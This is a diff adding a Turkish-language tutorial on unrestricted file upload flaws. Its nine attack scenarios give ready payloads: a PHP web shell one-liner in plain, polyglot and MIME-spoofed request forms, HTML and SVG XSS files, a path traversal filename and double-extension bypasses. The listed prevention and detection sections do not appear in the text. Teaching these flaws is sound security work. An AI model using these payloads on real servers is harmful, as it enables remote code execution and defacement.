@@ -1,0 +1,200 @@
+# 📂 Unrestricted File Upload Rehberi (2025)
+
+---
+## 📑 İçerik
+- [Giriş](#-giriş)  
+- [Dosya Yükleme Açıklarının Temel Mantığı](#-dosya-yükleme-açıklarının-temel-mantığı)  
+- [Dosya Yükleme Açık Türleri](#-dosya-yükleme-açık-türleri)  
+- [Temel Saldırı Senaryoları](#-temel-saldırı-senaryoları)  
+- [Payload Örnekleri](#-payload-örnekleri)  
+- [WAF / Filtre Bypass Teknikleri](#-waf--filtre-bypass-teknikleri)  
+- [Tespit Yöntemleri](#-tespit-yöntemleri)  
+- [Unrestricted File Upload ile Olası Saldırılar](#-unrestricted-file-upload-ile-olası-saldırılar)  
+- [Önleme Yöntemleri](#-önleme-yöntemleri)  
+- [Test Ortamları](#-test-ortamları)  
+- [Kaynaklar](#-kaynaklar)  
+
+---
+
+## 🎯 Giriş
+Unrestricted File Upload (Sınırsız Dosya Yükleme), web uygulamalarında **kullanıcının yüklediği dosyaların doğru şekilde doğrulanmaması** sonucu oluşan kritik bir güvenlik açığıdır.  
+
+Bu açık sayesinde saldırganlar, sisteme zararlı dosyalar yükleyebilir ve şu riskler ortaya çıkabilir:
+- **Web Shell** yükleyerek uzaktan komut çalıştırma (RCE)  
+- **XSS veya HTML injection** barındıran dosyalarla saldırı  
+- **Malware / Trojan** yükleyerek kullanıcıları enfekte etme  
+- **Dosya taşıma / overwrite** ile sistemdeki mevcut dosyaları bozma  
+
+Özellikle dosya yükleme fonksiyonlarının sıkça kullanıldığı alanlarda (profil resmi yükleme, belge yükleme, CV yükleme vb.) bu açık çok kritik hale gelir.  
+
+📌 OWASP’ın en tehlikeli açıklar listesinde **yüksek riskli** kategoridedir çünkü genellikle **uzaktan sistem ele geçirme** (Remote Code Execution - RCE) ile sonuçlanır.  
+
+---
+
+## 🧩 Dosya Yükleme Açıklarının Temel Mantığı
+Dosya yükleme açıklarının temel mantığı, **kullanıcının yüklediği dosyanın yeterince kontrol edilmeden sunucuya kaydedilmesi** durumudur.  
+
+Normal şartlarda dosya yükleme süreci şu adımlarla güvenli olmalıdır:  
+1. Dosya uzantısının kontrol edilmesi (.jpg, .png, .pdf vb.)  
+2. MIME type kontrolü (Content-Type doğrulaması)  
+3. Dosya boyut sınırı (örn: max 2 MB)  
+4. Dosyanın güvenli bir klasöre kaydedilmesi (web root dışında)  
+5. Dosya isminin sanitize edilmesi (özel karakterler temizlenmeli)  
+6. Gerekirse dosyanın **içeriğinin** analiz edilmesi (örneğin antivirüs taraması)  
+
+Ancak uygulamalarda genellikle şu zayıflıklar görülür:  
+- Sadece **uzantı kontrolü** yapılır, içerik kontrol edilmez.  
+- **MIME type** sadece istemci tarafında doğrulanır.  
+- Dosya **web root** altında kaydedilir → direkt erişim mümkün olur.  
+- Dosya isimleri kontrol edilmez → overwrite veya path traversal yapılabilir.  
+
+Böylece saldırgan:  
+- `.php`, `.asp`, `.jsp` gibi **script dosyaları** yükleyip çalıştırabilir.  
+- `.html` dosyasıyla **XSS / phishing sayfası** barındırabilir.  
+- Büyük dosyalar yükleyip **DoS (Disk dolumu)** saldırısı yapabilir.  
+
+📌 Kısacası temel problem: **Yetersiz input validation ve insecure file handling**.  
+
+---
+
+## ⚔️ Temel Saldırı Senaryoları
+
+Dosya yükleme açıkları, saldırganlara farklı yöntemlerle sistemi istismar etme imkanı sunar. Aşağıda en kritik senaryolar ve örnek payloadlar listelenmiştir.  
+
+---
+
+### 1. Web Shell Yükleme (Remote Code Execution - RCE)
+Saldırgan yükleme formuna zararlı bir **PHP shell** yükleyerek doğrudan sunucuda komut çalıştırabilir.  
+
+**Payload (shell.php):**
+<?php system($_GET['cmd']); ?>
+
+**Kullanım:**
+http://hedefsite.com/uploads/shell.php?cmd=whoami  
+
+**Sonuç:**
+Sunucuda komut çalıştırma yetkisi elde edilir. Bu, dosya okuma/yazma, privilege escalation ve tüm sistem ele geçirme ile sonuçlanabilir.  
+
+---
+
+### 2. HTML/JS Dosyası ile XSS
+Dosya yükleme alanına zararlı bir `.html` dosyası yüklenerek, site üzerinde XSS tetiklenebilir.  
+
+**Payload (xss.html):**
+<html><body><script>alert('XSS - File Upload')</script></body></html>
+
+**Kullanım:**
+http://hedefsite.com/uploads/xss.html  
+
+**Sonuç:**
+Kurban dosyayı açtığında tarayıcıda XSS çalışır. Çerez çalma, phishing sayfası açma gibi saldırılar yapılabilir.  
+
+---
+
+### 3. Zararlı Dosya ile Malware Bulaştırma
+Saldırgan zararlı bir `.exe` veya `.pdf` dosyası yükler. Kullanıcı bu dosyayı indirip açtığında sistemine malware bulaşır.  
+
+**Payload:**
+evil.pdf (içine gömülü reverse shell exploit)  
+
+**Kullanım:**
+http://hedefsite.com/uploads/evil.pdf  
+
+**Sonuç:**
+Kurban dosyayı açtığında sistemine zararlı yazılım yüklenir. Bu yöntem phishing kampanyaları ile birleştirildiğinde çok etkilidir.  
+
+---
+
+### 4. Path Traversal ile Dosya Ezme
+Dosya isimlerinin filtrelenmemesi durumunda saldırgan `../../` gibi dizin geçişleriyle sistem dosyalarını ezebilir.  
+
+**Payload (filename):**
+../../../../var/www/html/index.php  
+
+**Kullanım:**
+Resim yüklerken bu dosya adı verilirse, uygulamanın ana sayfası overwrite edilebilir.  
+
+**Sonuç:**
+Mevcut sistem dosyaları saldırganın yüklediği içerikle değişir. Örneğin ana sayfa deface edilebilir.  
+
+---
+
+### 5. Büyük Dosya Yükleme ile Disk Doldurma (DoS)
+Dosya boyutu sınırı kontrol edilmediğinde saldırgan çok büyük boyutlu dosyalar yükleyebilir.  
+
+**Payload:**
+50GB dummy file  
+
+**Kullanım:**
+Arka arkaya devasa dosyalar yüklenir.  
+
+**Sonuç:**
+Disk alanı dolar, uygulama veya sunucu kullanılamaz hale gelir (Denial of Service).  
+
+---
+
+### 6. Polyglot Dosya ile Çift Amaçlı Saldırı
+Saldırgan aynı dosya içinde hem resim hem script bulundurabilir. Bu sayede yükleme sırasında resim gibi görünür, çalıştırıldığında script olarak çalışır.  
+
+**Payload (shell.jpg.php):**
+GIF89a
+<?php system($_GET['cmd']); ?>
+
+**Kullanım:**
+Dosya uzantısı `jpg.php` olursa bazı zayıf filtreler bunu resim gibi kabul eder.  
+
+**Sonuç:**
+Resim gibi görünen dosya aslında bir web shell olarak kullanılabilir.  
+
+---
+
+### 7. MIME Type Manipülasyonu
+Sunucu sadece Content-Type headerına bakıyorsa saldırgan burayı manipüle edebilir.  
+
+**Payload (HTTP Request):**
+POST /upload HTTP/1.1
+Content-Type: image/png
+Content-Disposition: form-data; name="file"; filename="shell.php"
+
+<?php system($_GET['cmd']); ?>
+
+**Kullanım:**
+Dosya PHP shell içeriyor olmasına rağmen Content-Type image/png olduğu için kabul edilebilir.  
+
+**Sonuç:**
+Zararlı script çalıştırılabilir hale gelir.  
+
+---
+
+### 8. Double Extension ile Filtre Bypass
+Bazı uygulamalar sadece ilk veya son uzantıya bakar.  
+
+**Payload:**
+shell.php.jpg  
+shell.jpg.php  
+
+**Kullanım:**
+http://hedefsite.com/uploads/shell.php.jpg (sunucu tarafında PHP gibi yorumlanabilir)  
+
+**Sonuç:**
+Filtre atlatılarak script dosyası yüklenmiş olur.  
+
+---
+
+### 9. SVG Dosyası ile XSS
+SVG dosyaları XML tabanlı olduğu için içine script gömülebilir.  
+
+**Payload (evil.svg):**
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS via SVG')"></svg>
+
+**Kullanım:**
+http://hedefsite.com/uploads/evil.svg  
+
+**Sonuç:**
+Kurban SVG dosyasını açtığında tarayıcıda XSS tetiklenir.  
+
+---
+
+📌 Özet:  
+Unrestricted File Upload açıkları sadece **sunucu tarafı RCE** için değil, aynı zamanda **istemci tarafı XSS**, **malware yayma**, **defacement**, **DoS** gibi birçok saldırı senaryosuna kapı aralar.  
+
